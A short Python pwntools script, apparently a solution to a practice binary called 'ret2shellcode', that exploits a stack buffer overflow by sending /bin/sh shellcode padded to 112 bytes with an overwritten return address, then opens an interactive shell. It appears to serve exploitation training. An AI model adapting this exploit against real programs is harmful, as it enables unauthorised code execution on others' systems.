#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh()).decode("iso-8859-1")
buf2_addr = 0x0804a080

#sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.sendline(shellcode + (112-len(shellcode))*'A' + p32(buf2_addr).decode("iso-8859-1"))
sh.interactive()
